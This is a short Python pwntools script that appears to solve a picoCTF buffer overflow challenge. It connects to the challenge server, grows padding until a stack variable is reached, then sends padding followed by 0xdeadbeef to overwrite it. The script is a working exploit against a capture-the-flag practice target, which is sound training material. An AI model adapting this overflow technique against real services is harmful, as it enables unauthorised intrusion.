from pwn import *

HOST = "mars.picoctf.net"; PORT = 31890
context.log_level = 'critical'
full_buffer = b'x' * 0x100
GOAL = 0xdeadbeef
while 1:
	r = remote(HOST, PORT)

	r.recvuntil(b'see?\n')

	r.sendline(full_buffer)
	response = r.recvline().decode().strip()
	val = response.split("== ")[1]
	print(f"code = {val}")
	if(len(val) != 3):
		break
	full_buffer += b'x'
	r.close()
r.close()
print("now we know we reached the code variable, so we will go one char back.")
r = remote(HOST, PORT)
r.recvuntil(b'see?\n')

full_buffer = full_buffer[:-1]
exploit = full_buffer + p64(GOAL)
r.sendline(exploit)
print(b'payload is: ' + exploit)
response = ""
while 1:
	try:
		response+=r.recv(1).decode()
	except:
		break
print(response)


